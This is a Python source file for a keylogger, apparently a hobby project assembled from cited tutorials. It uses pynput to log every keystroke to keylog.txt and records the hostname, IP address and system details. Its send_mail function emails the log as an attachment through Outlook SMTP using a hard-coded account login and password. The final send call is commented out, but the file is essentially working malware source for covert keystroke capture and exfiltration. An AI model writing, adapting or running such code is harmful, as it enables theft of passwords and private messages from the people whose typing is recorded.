# code :
# https://www.codeitbro.com/how-to-create-keylogger-in-python/
# https://www.geeksforgeeks.org/send-mail-attachment-gmail-account-using-python/

from pynput.keyboard import Key, Listener
import logging
import os
import socket
import platform
import requests
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# the log file
keylog = "keylog.txt"

# where to save the log file
log_dir = os.path.dirname(os.path.abspath(__file__))

sysinfo = "systeminfo.txt"

# disposable email created only for this project
mail = "victime.bolosse@outlook.com"
pswd = "v1ct1m3b0l0ss3"

# save at least debug level logs in a file called keylog.txt with the date, time and level
logging.basicConfig(filename = (log_dir + keylog), level=logging.DEBUG, format='%(asctime)s: %(levelname)s: %(message)s')

# save the key pressed as an info level log
def pressed(key):
    logging.info(str(key))

# create a listener
with Listener(on_press=pressed) as listener:
    listener.join()

# get information about the system
def pc_infos():
        # get the hostname
        hostname = socket.gethostname()
        logging.info("Hostname: " + hostname)

        #get the private IP address
        ipaddr = socket.gethostbyname(hostname)
        logging.info("Private IP address: " + ipaddr)

        # get the public IP address
        # try:
        #     public_ip = get("https://api.ipify.org").text # https://www.ipify.org/
        #     logging.info("Public IP address: " + public_ip)
        # except Exception:
        #     logging.error("Couldn't get Public IP address, sad")

        # get the system and version
        logging.info("System: " + platform.system() + " " + platform.version())

        # get the machine type
        logging.info("Machine: " + platform.machine())

# send the log file as an attachment in an email
def send_mail(filename, attachment, sendto):
    # create a message which can contain attachments of different types
    msg = MIMEMultipart()
    msg['From'] = mail
    msg['To'] = sendto
    msg['Subject'] = "Secret totally legal keylogger"
    body = "Don't show this to anyone. Nothing's suspicious here but still don't show this to anyone."
    
    # add the body to the message
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, "rb")

    base = MIMEBase('application', 'octet-stream')

    # encode the attachment in base64 (payload = content of the email)
    base.set_payload((attachment).read())
    encoders.encode_base64(base)

    # add a header to the message
    base.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(base)

    # create a SMTP session (smtp_server, smtp_port)
    session = smtplib.SMTP('smtp-mail.outlook.com', 587)

    # start TLS session for security
    session.starttls()

    # login
    session.login(mail, pswd)

    # convert the message to a string
    textmsg = msg.as_string()

    # send the email
    session.sendmail(mail, sendto, textmsg)

    # terminate the session
    session.quit()

# send_mail(keylog, (log_dir + keylog), mail)